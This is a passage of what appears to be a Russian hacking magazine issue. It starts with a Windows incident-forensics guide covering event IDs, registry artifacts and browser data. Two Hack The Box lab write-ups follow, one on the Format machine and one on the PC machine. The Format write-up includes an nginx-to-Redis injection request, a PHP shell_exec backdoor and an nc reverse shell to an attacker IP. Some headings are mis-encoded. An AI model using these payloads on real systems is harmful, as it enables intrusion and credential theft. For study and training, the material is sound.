C:\Users\<User>\AppData\Local\ConnectedDevicePlatform\L.<username>

Ес ли ты авто ризо вался от имени учетной записи Microsoft, то наз вание пос-
ледней пап ки будет сформировано из 16 буквенно-цифровых символов
(Microsoft ID), а при авториза ции пользователя с помощью Microsoft Azure
файл располагается в каталоге AAD.<ID>.
   Эта шкала предназначена для синхронизации между разными устрой ства-
ми. В дополнение к самой базе ты найдешь файл с расширениями db-shm,
включающий данные о времени, и db-wal — журнал предварительной
записи, который хранит информацию перед переда чей ее в ActivityCache.
db. Под робное опи сание структуры времен ной шкалы и процес са записи
событий мож но найти в статье Windows Timeline (PDF).
  В  ActivityCache.db  целых  семь  таб лиц,  но  нужная  нам  инфа
об активнос ти поль зователя лежит в двух таб лицах: Activity_PackageId
и Activity.
  В таб лице Activity есть следующие поля:
 • AppId — объект JSON, содержащий информацию об исполняемом фай-
   ле;
 • StartTime и EndTime — время начала и окон чания работы исполняемо-
   го фай ла в UTC, фор мат времени — Epoch Time;
 • PlatformDeviceID — идентификатор устройства; это поле будет другим
   в случае синхро низации с облаком Microsoft;
 • ActivityTypes — определя ет тип активности и может иметь следующие
   значения: 2 (уведомление), 3 (резервное копиро вание / аутентификация
   в Azure), 5 (открытие приложения, фай ла или веб-страницы), 6 (при ложе-
   ние исполь зует ся), 10 (текст ско пирован в буфер обмена), 11, 12, 15 (сис-
   темные опе рации Windows), 16 (операции копиро вания или вставки);
 • Payload — поле представлено в формате JSON и содер жит информацию
  об откры том фай ле: имя, путь и описание.

В таблице Activity_PackageId хранит ся информа ция о приложе нии: рас-
положение исполняемо го фай ла, его имя, а также вре мя истечения срока
дей ствия записи (поле Expiration Time). Записи в этой таб лице хра нят-
ся 30 дней.
   Ути литы для анализа ActivityCache.db:
 • WxTCmd.exe;
 • DB Browser for SQLite;
 • AXIOM.

Давай попробуем открыть этот файл в DB Browser for SQLite.





                    Прос мотр таблицы Activity

Пе реходим на вкладку SQL и вставляем следующий запрос SQLite. В окне
вывода зап роса видим вот такие поля.




Сор тируя вывод по полю StartTime, удоб но отслеживать хронологию дей-
ствий зло умышленников.


ÀÍÀËÈÇÈÐÓÅÌ ÑÎÁÛÒÈß WINDOWS

В этом разделе разберем основные события Windows, анализ которых
поможет  иссле дователю  вос становить  картину  компрометации  хоста
и понять, как злоумыш ленники перемещались по сети. В Windows есть
базовые и расширенные политики аудита. Процесс настройки расширенной
полити ки аудита опи сан в статье на Anti-Malware.
   Рас смот рим события вхо да в Windows. Все перечисленные идентифика-
торы событий включены в политику ауди та по умол чанию.
 • 4624 — вход в систему. Изу чая это событие, всегда обращай внимание
   на тип входа (список представлен в докумен тации Microsoft), имя учетной
   записи, код входа, домен, а также на поле сведения о сети, в котором
  может быть указан сетевой адрес источника входа.
 • 4634 — выход из системы. При ана лизе этого события сопоставляй код
   входа с событием 4624, что бы получить продол житель ность сеанса.
 • 4625 — ошиб ка вхо да в систему. Тут важен тип входа, код входа, имя учет-
   ной записи, све дения о сети, а также код ошибки. Например, ошибка
  0xC000006A говорит о неп равильном вво де логина и пароля. Если таких
   событий много, значит, кто-то подбирал пароль.
 • 4648 — вход в систему с явным указани ем аутентификационных данных.
  Событие регистри руется на хосте источника авторизации. При поис ке
   боково го переме щения по сети анализ этого события укажет на хост, учет-
  ные данные, а также процесс, ини циирующий авторизацию (wmic.exe,
  sc.exe или какой-то дру гой).
 • 4672 — сеансу вхо да назначены специальные привиле гии. Для отсле-
   живания пользователя с назначенными при вилегиями нужно сопоставить
   поле «код вхо да» с событи ем 4624. Список возможных привиле гий:
    • SeTcbPrivilege — действие в качестве части операци онной сис-
     темы;
    • SeBackupPrivilege — резервное копирование файлов и каталогов;
    • SeCreateTokenPrivilege — создание объ екта мар кера;
    • SeDebugPrivilege — отладка программ;
    • SeEnableDelegationPrivilege —  доверять  учетным  записям
     компьюте ров и пользователей для делегирования;
    • SeAuditPrivilege — создание ауди та безопасности;
    • SeImpersonatePrivilege — олицетворение клиента после аутен-
     тификации;
    • SeSecurityPrivilege — управление журналами аудита и безопас-
      ности;
    • SeSystemEnvironmentPrivilege — изменение значений среды
     встро енно го ПО;
    • SeAssignPrimaryTokenPrivilege — замена токена уровня процес-
      са;
    • SeRestorePrivilege — вос становление фай лов и каталогов;
    • SeTakeOwnershipPrivilege — поз воляет стать владельцем файлов
     или других объ ектов.
 • 21 (RDP) — вход в сеанс выполнен успешно. Это событие расположе но
   в канале Microsoft/Windows-TerminalServices-LocalSessionManager.
  При анализе обращай вни мание на имя вошедшего в систему пользовате-
   ля и IP-адрес источника. Это событие соп ровождается событием 4624,
   тип вхо да 10.

А вот эти события могут озна чать, что в системе закрепился зло умышленник:
 • 7045, 4697 (по умолчанию не уста новлены) — в системе установлена
   служба. При анализе этих событий обра щай внимание на имя соз дава-
  емой службы, имя исполня емого файла и учетные данные пользователя.
   Учти, что в событии 7045 не ука зывается имя поль зователя, который соз-
   дает служ бу. К примеру, при выполнении PsExec по умол чанию будет соз-
   дана служба с име нем PSEXESVC.
 • 4699 — удаление службы.
 • 106  (ðåãèñòðàöèÿ  çàäà÷è), 140  (îáíîâëå íèå  çàäà÷è), 119
   (çàïóñê ýêçåìïëÿðà çàäà÷è â ñâÿçè ñ âõî äîì ïîëüçîâàòå ëÿ) —
   эти события регистрируются в журнале Microsoft-Windows-Task-
  Scheduler/Operational. Так же при настройке рас ширенной политики
   ауди та аналогичные задания соз даются в журнале Security с идентифика-
   тора ми 4698 (çàïëàíèðî âàí íîå çàäàíèå ñîç äàíî), 4700 (çàï-
  ëàíèðî âàí íàÿ  çàäà÷à  âêëþ÷åíà),  4702   (çàïëàíèðî âàí íîå
  çàäàíèå îáíîâëå íî).
 • 5861 —  событие,  которое  возникает  при  регистрации  привяз ки
  FilterToConsumerBinding WMI. Это событие регистри руется в жур-
   нале Microsoft-Windows-WMI-Activity/Operational.

Доступ к общим сетевым ресурсам:
 • 5140  (ïîëó÷åí äîñòóï  ê îáùå ìó  ñåòåâî ìó ðåñóðñó), 5145

  (ïîëó÷åí  äîñòóï  ê  îáùå ìó  ñåòåâî ìó  îáú åêòó,  êàòàëî ãó
  èëè ôàéëó) — при боковом переме щении эти события будут содержать
   сетевые адреса, а так же каталоги C$ , ADMIN$ и IPC$, к которым пытаются
   получить дос туп злоумышленники.

Большое количес тво артефактов выполнения при ложе ний в сис теме предос-
тавляют события PowerShell:
 • 400  (по  умолчанию  установлено) —  начало  выпол нения  команды
   или сеан са, в поле «командная строка» указаны параметры запус ка
   PowerShell.
 • 800 — выполнение кон вей ера.
 • 4103 — жур налирование модулей.
 • 4104 — протоколирование блока сце нари ев. В этом событии записы-
   вают ся все блоки, которые выполняют ся пос ледовательно при выпол-
   нении скрип тов PowerShell.

Анализ события создания процес са 4688 поз воляет отслеживать запус-
каемые в сис теме исполняемые фай лы. Обра щай вни мание на имя учетной
записи и информацию о процессе. В поле Process Command Line указано имя
запускаемо го файла и его  аргумен ты. Событие 4689 сви детельствует
о завершении процесса.
  При входе в учетную запись с использованием Kerberos или NTLM события
регистри руют ся на контроллере домена. Вот какие бывают события входа
в учетную запись и дос тупа к объектам AD:
 • 4662 — операция над объектом домена Active Directory. Анализ этого
   события позволя ет выявить ата ку DCSync. Тут важно поле Account Name,
   которое дол жно содер жать имя учет ной записи контрол лера домена (к
   примеру, DC$) или NT AUTHORITY/SYSTEM. Поле Access Mask дол жно
   иметь значение 0x100. Также исследуй поле Properties, которое
   содер жит маску доступа Control Access, и GUID типа дос тупа, связанный
   с реп ликаци ей.
 • 4768 — зап рос Kerberos TGT, обращаем внимание на ошибки.
 • 4769 — запрос Kerberos TGS. При анализе события обра щай внимание
   на имя службы (в имени должен присутс твовать знак $ ), код ошибки и тип
  шифрования  билета. Ана лиз  это го события позволит выявить  атаку
   Kerberoasting.
 • 4771 — сбой предваритель ной аутентификации Windows. Событие воз-
   никает толь ко на контроллере домена и генери рует ся для поль зователей
   с флагом предварительной аутен тифика ции. При анализе этого события
   необходимо обращать внимание на имя пользователя, при аутентифика-
   ции которого произошел сбой.
 • 4776 — аутен тифика ция с использованием NTLM.
 • 4720 — создание учетной записи. Это событие регистрируется на кон-
   троллере домена, серверах и рабочих станциях.
 • 4728 — объект домена добавлен в гло бальную группу пользовате лей.
 • 4732 — объект добавлен в локальную группу пользователей.
 • 4756 — объект добавлен в универсальную груп пу.
 • 4798 — перечисление членства пользователя в локаль ной группе.

Еще сто ит упо мянуть логи утилиты Sysmon, которые мы не будем разбирать.
Однако они могут рассказать подробности о дей ствиях злоумышленников,
показать события рас ширенной политики аудита по доступу к файлам и вет-
кам реестра, а так же сетевой активности.
  Инструменты для анализа:
 • Hayabusa — инструмент для быстрого анализа логов, основан ный на пра-
   вилах Sigma;
 • FullEventLogView — утилита NirSoft для анализа событий. Она поз воля ет
  фильтровать логи по датам, идентификаторам событий, а так же по клю-
  чевым словам. Для использования дос таточ но указать каталог с файлами
  evtx. В расширенных настройках ука зыва ем через раз делитель иден-
   тификаторы событий и промежу ток времени;
 • EventLogExplorer — решение для просмотра, анализа и монито ринга
   событий Windows;
 • LogonTracer — инструмент анализа логов входа, отображающий информа-
  цию в виде гра фов. LogonTracer связывает имя хоста или IP-адрес и имя
   учетной записи, най ден ное в событиях. При анализе логов контрол лера
  домена обязательно воспользуйся этим инструментом. Он отлично эко-
   номит время ана лиза.





             Фильтрация логов по событиям и времени


Äåéñòâèÿ ïîëüçîâàòåëåé
Часто инциденты про исхо дят по вине пользователя, к примеру когда он заг-
ружает программы из неп роверенных источни ков или запускает вре донос ные
вло жения из поч ты. Давай рассмотрим артефак ты, которые позволяют
понять, что кон кретно он делал.


Most Recently Used
MRU  (Most  Recently Used) — артефакт Windows,  в котором хранится
информация о взаимодействии пользователя с фай лами и каталогами через
про вод ник. В кус те NTUSER.DAT каждого поль зователя есть ключи, отно сящи-
еся к MRU.
  Нап ример, вот в этом клю че реестра хра нится список файлов, сгруп-
пированных по расширению, и список каталогов, с которыми взаимодейство-
вал пользователь:


NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\
RecentDocs

При анализе записи обращай вни мание на дату открытия и имя файла.
  А  вот  этот  ключик  хранит  информацию  о  запус каемых  командах
при помощи утилиты Windows Run (горячая клавиша Windows-R):


NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

И наконец, ключ, содержащий информацию о фай лах, к которым обращал ся
поль зователь с помощью диалогового окна открытия или сохранения файла:


NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\
ComDlg32





                Со держимое ключа RecentDocs

Спи сок файлов и катало гов, с которыми вза имодей ствовал пользователь, ты
най дешь по такому пути:


C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Recent

Отсорти ровав файлы по временной мет ке, мож но восстановить пос ледова-
тель ность запуска приложений и открытия файлов. При ана лизе этого арте-
факта обращай внимание на фай лы с расширениями  .lnk, которые могут
содержать коман ды запуска сценари ев PowerShell или CMD. Для анализа
файлов c расширением .lnk мож но вос пользовать ся инструментом LECmd.


Shellbags
Shellbags — это набор ключей реестра, которые содержат сведения о прос-
матри ваемых пользователем катало гах. Начиная с Windows 7, этот артефакт
хранится в кусте реестра


C:\Users\<user>\AppData\Local\Micrososft\Windows\UsrClass.dat

Для Windows XP упомянутый набор арте фактов хра нится в кусте реес тра
NTUSER.DAT. Shellbags хранит временные мет ки доступа к каталогам, в том
числе к общим сетевым ресурсам.
  Для удобства анализа мож но воспользовать ся ути литой ShellBagsExplorer,
в которую необходимо загрузить куст реестра UsrClass.dat.





              Список каталогов, хра нимый в Shellbags


SRUM
Эта  лег кая для запоминания аббревиату ра озна чает System  Resource
Utilization Monitor. С восьмой вер сии в Windows появилась воз можность
отсле живать используемые при ложениями ресурсы. Этот артефакт рас-
положен  в  фай ле  C:\Windows\System32\sru\SRUDB.dat.  Информация
записы вается в базу каждый час и при выключении компьютера.
  В базе хра нятся следующие артефакты: сетевые подключения, исполь-
зование  сети, энер гопотребление, данные  push-уведомлений,  а  также
использование ресурсов приложениями. Ана лиз активнос ти сети и сетевых
под клю чений  помогает  опре делить,  когда  компь ютер  был  подключен
к интернету и каким способом, а также количес тво полученных и отправ-
ленных при ложе нием данных в бай тах. Мы ана лизировали этот артефакт
при решении кейса Pwned-DC.
  Инструменты для анализа:
 • SRUM-DUMP — этот инструмент использует шаб лон Excel для вывода соб-
   ранных данных в таблицу;
 • SrumECmd.


Äàííûå áðàóçåðîâ
Браузер нын че самая глав ная прог рамма на компьютере, и многие действия
поль зователь совершает именно в ней. Здесь же най дут ся и важные для рас-
следования арте факты. Нап ример, в ходе фишинговых атак злоумышленни ки
рас сылают сообщения, содержащие либо ссылку на вре доносный файл, либо
сам файл. Информация о загрузке пользователем такого файла попадет
в журнал браузера.
  Профиль браузера Firefox:


C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\[profileID]

В файле places.sqlite ты найдешь две полезные таблицы: moz__places
содержит исто рию браузера, moz__annos — информацию о загрузках. А в
файле cookies.sqlite лежат все сохраненные куки.
  Инструменты для анализа:
 • MZHistoryView — утилита для анализа истории бра узера;
 • MZCacheView — утилита для анализа файлов кеша;
 • MZCookieView — ути лита для анализа файлов cookies;
 • DB Browser  for SQLite — инструмент прос мотра базы данных SQLite.
  При анализе таб лиц исто рии браузе ра нужно будет преобразовать вре-
  менные метки сле дующим выражением: datetime(lastvisitdate/
  1000000,'unixepoch').

Профиль Chrome:


C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Default

Ис торию посеще ния страниц и загрузок мож но най ти в файле History, она
хранится в базе SQLite, в таб лицах urls и downloads. Файлы кеша лежат
в каталоге Cache\Default Cache. Рас ширения браузера хра нятся в каталоге
Extensions.
  Инструменты для анализа:
 • ChromeHistoryView — ана лиз исто рии бра узе ра;
 • ChromeCacheView — анализ кеша;
 • DB Browser for SQLite — при анализе таблиц urls и downloads необ-
   ходимо  пре образовать  вре менные  мет ки  следующим  выражением:
  datetime(("last_visit_time"/1000000)-11644473600,
  'unixepoch', 'localtime').

Путь к профилю Opera:


C:\Users\%username%\AppData\Roaming\Opera Software\Opera Stable

Формат исто рии и загрузок тот же, что и у Google Chrome. То же самое и у
Yandex Browser.
  История посеще ний Internet Explorer:


C:\Users\<User>\AppData\Local\Microsoft\Windows\History\index.dat

Для ее анализа можно воспользоваться утилитой IEHistoryView.
  Информация о загрузках в IE:


C:\Users\<user>\Appdata\Roaming\Microsoft\Windows\IEDownloadHistory

Кеш IE:


C:\Users\<User>\Appdata\Local\Microsoft\Windows\Temporary Internet
Files\Content.IE5

Для анализа пригодится тулза IECacheView.
  Артефак ты Microsoft Edge:


C:\Users\<User>\AppData\Local\Microsoft\Edge\User Data\Default

Пос коль ку Edge — это втайне Chromium, ана лиз истории, загрузок и кеша
будет выглядеть так же, как в Chrome.


ÂÛÂÎÄÛ

Мы рассмотрели основные артефакты Windows, которые специалист должен
изучить при рассле довании инци дента, а хакер, наоборот, может попытаться
скрыть. По пути мы соб рали инс трумен тарий для анализа. Используя эти тех-
ники, ты сможешь восста новить ход событий, описать атаку по матрице
MITRE ATT&CK и сделать какие-то выводы о зло умыш леннике.
ВЗЛОМ





    ПРОКСИРУЕМ ЗАПРОСЫ В REDIS
       ЧЕРЕЗ МИСКОНФИГ NGINX





В этом райтапе я покажу, как про изводить
запись данных в Redis бла года ря ошибке
в настройках Nginx. Также мы проанализи-
руем  исходники  веб-приложе ний,  что бы
найти ряд век торов для ата ки: LFI, повыше-             RalfHacker                                                                                             hackerralf8@gmail.com
ние роли пользовате ля и RCE. Для повыше-
ния привиле гий будем эксплуатировать уяз-
вимость f-строки в Python и получим скры-
тые данные приложе ния.


Уп ражняться мы будем на тренировочной машине Format с площадки Hack
The Box. Уровень ее сложности — сред ний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.213    format.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел три открытых пор та:
 • 22 — служба OpenSSH 8.4p1;
 • 80 и 3000 — веб-сервер Nginx 1.18.0.

Дополнительно в парамет ре http-title на порте 3000 отмечаем редирект
на http://microblog.htb:3000/. Добавляем этот домен в файл /etc/hosts
и идем смотреть сай ты.


10.10.11.213 microblog.htb format.htb





               Главная стра ница сайта microblog.htb:3000

Веб-сервер на порте 80 вернул код 404, а на 3000 нас встре тил Git.


ÒÎ×ÊÀ ÂÕÎÄÀ
Мы сразу можем поис кать открытые репозитории и пользователей.





                   Открытые репози тории в Git

Видим  доступный  репозиторий  microblog. Ска чиваем фай лы про екта
для изучения.





               Содержимое репозитория microblog

Ис ходные коды наш ли, а сайта пока не видно. Поскольку нам известно реаль-
ное доменное имя, нужно просканиро вать поддомены. Вдруг там дос тупны
другие сай ты? Для это го будем использовать утилиту ﬀuf.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю лег кий и очень быс трый ﬀuf. При запус ке указываем сле-
дующие парамет ры:
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -H — HTTP-заголо вок.

Место перебора помеча ется сло вом FUZZ.


Ко ман да получа ется следующая:


ffuf -u http://microblog.htb -w subdomains-top1million-110000.txt -t
256 -H 'Host: FUZZ.microblog.htb'





          Ре зультат ска нирования поддоменов с помощью ﬀuf

Находим два новых под домена, поэто му обновим запись в файле /etc/
hosts, а затем посмотрим, какие сайты там хостятся.


10.10.11.213 microblog.htb format.htb app.microblog.htb sunny.
microblog.htb





                Главная стра ница сайта app.microblog.htb





               Глав ная страница сай та sunny.microblog.htb




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




             ПРОКСИРУЕМ ЗАПРОСЫ В REDIS ЧЕРЕЗ
                          МИСКОНФИГ NGINX





ÒÎ×ÊÀ ÎÏÎÐÛ
Начинаем изучать исходный код приложе ния и на втором сайте находим
потенциальную   уяз вимость   инъ екции   команд  ОС   в   функции
provisionProUser из файла edit/index.php. После предварительной про-
верки isPro() == true (строка 26) в функцию system передается результат
выполнения другой функции getBlogName (стро ки 27–32).





                Со держимое файла edit/index.php

В том же фай ле расположен и код функций isPro и getBlogName. Первая
обращает ся к базе Redis (строки 129–132) и для текущего поль зователя про-
веряет параметр pro (видимо, это какая-то мет ка администратора). Вторая
функция извлекает под домен из HTTP-заголовка Host. То есть для test.
domain.com функция getBlogName вернет строку test.





                Со держимое файла edit/index.php

У нашего поль зовате ля нет адми нистра тив ного доступа, поэтому экс плуати-
ровать инъекцию мы пока не смо жем. Но в этом же файле находим воз-
можность подклю чить к сайту содержимое про изволь ного фай ла на сервере,
что дает нам LFI. Мы можем в параметре id отпра вить имя файла для подклю-
чения, глав ное, что бы этот файл сущес тво вал. Если такой файл не существу-
ет, то он будет создан и в него запишет ся текст из параметра txt. Затем
файл будет под клю чен к сай ту (строки 81–91).





                Со держимое файла edit/index.php

Проверим наше предположение.


LFI
Пе реходим к первому сай ту, регистри руемся и авто ризуемся. Это дает нам
некоторые привилегии, а также расширяет область тестирования.





            Главная стра ница авто ризо ванного пользователя

Те перь нам доступна функция создания сво его бло га. Создадим блог ralf
и добавим запись в файл /etc/hosts.


10.10.11.213 microblog.htb format.htb app.microblog.htb sunny.
microblog.htb ralf.microblog.htb

Затем най дем в Burp History зап рос к сайту sunny и изменим HTTP-заголовок
Host, указав там имя только что соз данного блога. Таким образом мы обра-
тим ся к сво ему бло гу.





                    Зап рос к соз данно му блогу

Те перь попробуем подклю чить к сай ту файл /etc/passwd, путь к которому
передаем в параметре id, запросив стра ницу edit/index.php.





                Со держимое файла /etc/passwd

Таким обра зом подтвержда ем  LFI, поэтому следующим действием зап-
рашиваем настрой ки сервера /etc/nginx/sites-enabled/default. Вывод
получается ском канным, но ряд замен в CyberChef помогает пре образовать
файл в удобный формат.





                     Настройки веб-сервера


Ìèñêîíôèã Nginx proxy_pass
Разберем последнюю настройку:


location ~ /static/( .*) /( .*) {
    resolver 127.0.0.1;
    proxy_pass   http://$1.microbucket.htb/$2;
# }

При обращении к странице /static/dom/qwe.html запрос будет прок-
сирован на dom.microbucket.htb/qwe.html. Но фун кция proxy_pass в Nginx
под держивает еще и запросы к локальным сокетам Unix и даже отправку
и получе ние дан ных.
  Формат для перезаписи ключа Redis будет следующим:


redis.sock:key val1 val2 val3

Таким образом, благодаря мисконфигу Nginx мы можем обратиться к сокету
Redis и перезаписать для нашего пользователя ralf параметр pro и зна-
чение true, что даст пользователю дополнительные при вилегии Pro. Сде лать
это мож но сле дующим зап росом.


curl -X HSET "http://microblog.htb/static/unix:
%2Fvar%2Frun%2Fredis%2Fredis.sock:ralf%20pro%20true%20a/b"





                        Зап рос на сервер

Этот зап рос будет прок сирован и преобразован в зап рос следующе го вида:


HSET /unix:/var/run/redis/redis.sock:ralf pro true a.microbucket.htb/
b

То есть в сокет /var/run/redis/redis.sock по ключу ralf будут записаны
зна чения pro, true и a.microbucket.htb/b. Обновляем стра ницу на сайте
и видим пометку Pro рядом с именем пользовате ля.





               Страница авто ризованного пользователя


RCE
Те перь перей дем  к RCE, для чего поместим PHP-бэкдор shell_exec
в каталог uploads. В параметре id отправ ляем путь к файлу /var/www/
microblog/ralf/uploads/rce.php, а в парамет ре txt — код бэкдора:


<?php echo shell_exec("curl+10.10.14.28/test_rce");?>

Затем обращаемся к созданному фай лу и про веря ем логи веб-сервера.





                      За пись PHP-бэкдора





                     Запрос к файлу бэкдора





                      Ло ги веб-сервера

В логах видим зап рос к стра нице test_rce, а значит, бэк дор отработал.
Теперь акти вируем листенер pwncat-cs и вмес то команды curl выпол няем
следующий реверс-шелл:


<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&
1|nc 10.10.14.28 4321 >/tmp/f");?>





                  Сессия поль зователя www-data


ÏÐÎÄÂÈÆÅÍÈÅ
Для продвижения к учетной записи пользователя чаще всего следует искать
учетные дан ные для разных баз, сервисов и служб. Так как на хосте работает
Redis и мы можем к нему подклю чить ся, нужно проверить сохраненные дан-
ные.


redis-cli -s /run/redis/redis.sock
keys *





                      Клю чи в базе Redis

Нас интересуют записи по клю чу cooper.dooper, получим их все.


hgetall cooper.dooper





                  Записи по ключу cooper.dooper

Видим записи username и password. С полученным паролем авторизуемся
по SSH от име ни пользователя cooper.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Те перь настало вре мя собрать информа цию о системе. Я буду использовать
для это го скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. В выводе будет мно го информа ции, смотрим самое интерес-
ное.
  Настрой ки sudoers доступны только при вво де пароля.



                       Настройки sudoers

Видим несколь ко фай лов, в том числе исполня емых, которые добавлены
в систему поль зователем.





               До бавленные поль зователем фай лы

Больше ничего интерес ного. Так как мы знаем пароль пользователя, все-таки
про верим нас тройки sudoers.


sudo -l





                       Настройки sudoers

Оказывается, мы можем запустить приложение /usr/bin/license от име ни
поль зовате ля root. Проверим тип файла с помощью утилиты file.


file /usr/bin/license




                     Проверка типа файла

Это скрипт на Python. Смотрим его исходный код в любом удобном редак-
торе. Это при ложе ние может быть запущено только при виле гиро ванным
поль зовате лем (строки 22–26).
  Затем при ложе ние чита ет секрет из файла /root/license/secret, а из
сек рета формируется ключ шифрования (строки 37–43).





                Исходный код приложения license

Затем приложе ние получает данные из базы Redis и открывает файл с клю-
чами лицензии /root/license/keys (стро ки 48–61). Следом из базы Redis
чита ются парамет ры username, first-name и last-name, которые вместе
с содержимым лицензии выводят ся поль зователю (строки 62–78).





                Исходный код приложения license

При выводе исполь зуется f-строка (строки 65 и 69). Так как через базу Redis
мы можем контролиро вать входные данные, поп робуем в качес тве одного
из параметров записать такую строку:


{license.__init__.__globals__[secret_encoded]}

Она должна будет вывести секрет!


redis-cli -s /var/run/redis/redis.sock


HMSET ralf first-name "{license.__init__.__globals__[secret_encoded]}
" last-name ralf username ralf




                       Запись в базу Redis

Те перь запускаем приложение, ука зывая созданный ключ ralf, и ищем
в выводе секрет.


sudo /usr/bin/license -p ralf





                     Экс плуата ция уяз вимости

По лученный секрет пробуем при менить в качестве пароля рута. Пароль под-
ходит, забираем пос ледний флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





     МАНИПУЛИРУЕМ ПРОТОКОЛОМ
     GRPC ПРИ ВЗЛОМЕ СЕРВЕРА




В этом райтапе я поз накомлю тебя с про-
токо лом gRPC ком пании  Google, затем
обна ружим и про эксплуатируем SQL-инъ-
екцию для SQLite. При повыше нии при виле-
гий  исполь зуем  уяз вимость  в  сервисе             RalfHacker                                                                                             hackerralf8@gmail.com
pyLoad.


По может нам в этом тре нировочная машина PC с площадки Hack The Box.
Уровень ее сложности — лег кий.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.214    pc.htb

И начинаем сканирование портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 50051 — неизвестный порт.

Ре зультаты очень скуд ные: в случае с SSH поможет только брутфорс учет ных
данных (а он при решении задач с HTB обычно не практику ется), а за что
отве чает порт 50051, пока непонятно.


ÒÎ×ÊÀ ÂÕÎÄÀ
Что за неизвестный порт? Дос таточ но поискать этот номер в интернете, что-
бы обнаружить, что его может держать открытым служба gRPC. Это реали-
зация протокола RPC (метода удаленного вызова процедур) с открытым
исходным кодом, разработанная в Google. gRPC предназна чен для работы
с различны ми механизмами аутен тифика ции, что упро щает обращение к нему
из других систем. Мож но использовать его с аутентификацией SSL/TLS
на осно ве токенов Google или без нее, а также подклю чить собственную сис-
тему аутентифика ции, расширив пре доставленный компанией код.
  Для работы по протоко лу gRPC будем использовать gRPC UI. Скачиваем
пос леднюю вер сию и запускаем, указывая сер вер и порт для подключения.


grpcui -plaintext 10.10.11.214:50051

В ито ге получим ссылку, которая поможет удоб но работать с сервером через
браузер.





                         Главное окно gRPC UI

Первым делом просматри ваем доступные методы. Мы можем зарегис три-
ровать поль зователя (RegisterUser), авторизовать ся в сервисе (LoginUser)
и получить какую-то информацию (getInfo).





                       Дос тупные методы

В плане безопасности этот сервис ничем не отличается от других таких же,
но я наугад решил поп робовать наиболее популярные логины и пароли.
Повезло очень быстро — подош ли логин и пароль admin:admin. Авто ризу-
емся и получаем токен.





                        Зап рос LoginUser





                        Ответ сервера

А теперь пробуем получить информацию о поль зователе, для чего нам при-
годится метод getInfo. Указываем в данных запроса полученный на пре-
дыдущем шаге идентификатор. Аутентифика цию нужно пройти с помощью
токена, для чего создаем запись token в метадан ных запроса.





                         Зап рос getInfo





                        Ответ сервера

Однако в итоге ничего интересного не получаем.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




           МАНИПУЛИРУЕМ ПРОТОКОЛОМ GRPC ПРИ
                            ВЗЛОМЕ СЕРВЕРА





ÒÎ×ÊÀ ÎÏÎÐÛ
Пе рейдем в Burp Suite и перенаправим зап рос в Burp Repeater. Так как мы
отправ ляем на сервер идентификатор пользователя и получа ем  ответ,
не исклю чено, что приложение использует базы дан ных. Поэтому стоит про-
верить, нет ли возможности для SQL-инъекции. Возь мем число, вызывающее
ошибку, а потом допол ним его усло вием or 1=1. Оно возвращает значение
TRUE, и в результате ошиб ки больше нет. Зна чит, есть воз можность для инъ-
екции.





                        От вет с ошиб кой





